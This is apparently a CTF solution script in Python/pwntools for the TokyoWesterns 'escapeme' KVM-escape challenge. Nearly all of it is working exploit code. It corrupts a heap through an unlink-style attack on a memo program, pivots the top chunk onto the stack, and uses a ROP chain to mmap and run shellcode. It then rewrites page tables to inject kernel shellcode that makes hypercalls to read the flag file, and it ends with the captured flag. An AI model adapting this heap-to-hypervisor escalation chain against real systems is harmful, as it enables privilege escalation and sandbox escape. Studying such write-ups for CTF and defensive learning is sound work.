#!/usr/bin/env python2

from pwn import *
import sys
import os
import subprocess

host, port = 'escapeme.chal.ctf.westerns.tokyo', 16359
local = False
if len(sys.argv) == 1:
  host = '127.0.0.1'
  local = True

def proof_of_work():
    chal = r.recvline().strip()
    assert 'hashcash -mb' in chal
    print(chal)
    r.sendline(subprocess.check_output(chal, shell=True).strip())

if local:
    #  r = process(['strace', '-e', 'read', './kvm.elf', 'kernel.bin', 'memo-static.elf', 'flag2.txt'])
    r = process(['./kvm.elf', 'kernel.bin', 'memo-static.elf', 'flag2.txt'])
else:
    r = remote(host, port)
    proof_of_work()
    r.sendlineafter('Any other modules? (space split) >', 'run.sh')

context.arch = 'amd64'

def pt():
    r.recvuntil('Exit')

def alloc(data):
    pt()
    r.sendline('1')
    r.sendafter('memo', data)

def edit(idx, data):
    pt()
    r.sendline('2')
    r.sendlineafter('id', str(idx))
    r.sendafter('memo', data)

def free(idx):
    pt()
    r.sendline('3')
    r.sendlineafter('id', str(idx))

mmap_ptr = 0x0000007fff1ff000
stack = 0x0000007fffffffb8 # return address of read in alloc
top_chunk_at = 0x604098
c_at = mmap_ptr + 0x20
alloc(
        # prepare args of mmap
        p64(0) + p32(0) + p32(0xffffffff) + p32(34) + p32(6) + p64(0x1000) + p64(0)
)
alloc('B' * 0x28)
alloc(flat(0, 0x51, c_at - 0x18, c_at - 0x10).ljust(0x28, 'C'))
alloc('D' * 0x28)
alloc('E' * 0x28)
alloc('F' * 0x28)
edit(3, 'D' * 0x20 + p64(0x50) + p8(0x30))
free(4)

fake_top = 0x604038
edit(2, p32(top_chunk_at)[0:3])
edit(1, p32(fake_top)[0:3])
for i in range(3):
    # dummy malloc
    alloc('\x00' * 40)

alloc('\x00' * 32 + p64(stack)) # let top chunk points to stack

# rop!
# ret 2 getint: 0x40055d
rbx = 0
rbp = stack - 0x10 + 0x80
pop_rbp = 0x400230
mmap = 0x400596
main = 0x400190
alloc(flat(rbx, rbp, 0x40055d, 0, 0))
#          ^ here is stack + 16
# now will call getnline(rbp-0x80, 88)
shellcode_at = 0x0000007fff1fe000
r.send(flat(
    # set rbp on heap
    pop_rbp, 0x606020 + 0x38,
    mmap, # args on rbp-0x38 ~ -0x18
    stack + 0x30, 
    0x40050d,
    stack, 0, 0, 0,
    shellcode_at
    ).ljust(88, '\x00'))

r.recvuntil('Added')

# read shellcode again, don't know why..
sc1 = asm(shellcraft.read(0, shellcode_at, 0x1000))
r.send(sc1)

# prevent read concat
sleep(0.1)

def mmap(addr, sz):
    return shellcraft.mmap(addr, sz, 6)

pause = shellcraft.read(0, 'rsp', 1)
shellcode = asm(
        mmap(0, 0x2000) + 'push rax\n' +
        shellcraft.write(1, 'rsp', 8) +
        'pop rbp' + shellcraft.munmap('rbp', 0x1000) +
        mmap(0x217000, 0x1000) +
        '''
        add rbp, 0x1000
        /* now, rbp points to a page table that 0x217000 will go through */
        add rbp, 0xb8 /* 0xb8 / 8 == 0x17 */
        mov QWORD PTR [rbp], 7
        mov QWORD PTR [rbp + 8], 0x1007
        mov QWORD PTR [rbp + 0x10], 0x2007
        mov QWORD PTR [rbp + 0x18], 0x3007
        ''' +
        # now 0x217000 points to the kernal base address
        # after read, invoke exit will be our kernel-shellcode
        shellcraft.read(0, 0x217000 + 0x1B5B, 0x300) +
        #  pause+
        shellcraft.exit(0)
        )

assert len(sc1) + len(shellcode) < 4096

r.send('\x90' * len(sc1) + shellcode)
# to prevent read concat
r.recvuntil('\x1f\xff\x7f\x00\x00\x00')

kernel_sc = asm('''
        mov rdi, 0
        call sys_load_file
        movabs rdi, 0x8040000000
        add rdi, rax
        mov rsi, 100
        call sys_write
        ret
    sys_write:
        mov eax, 0x11
        mov rbx, rdi
        mov rcx, rsi
        mov rdx, 0
        vmmcall
        ret
    sys_load_file:
        mov eax, 0x30
        mov ebx, 2 /* index 2, the flag2.txt */
        mov rcx, rdi /* addr */
        mov esi, 100 /* len */
        movabs rdx, 0x0
        vmmcall
        ret
        ''')
r.send(kernel_sc)
context.log_level = 'debug'
r.interactive()
# TWCTF{ABI_1nc0n51573ncy_l34d5_70_5y573m_d357ruc710n}
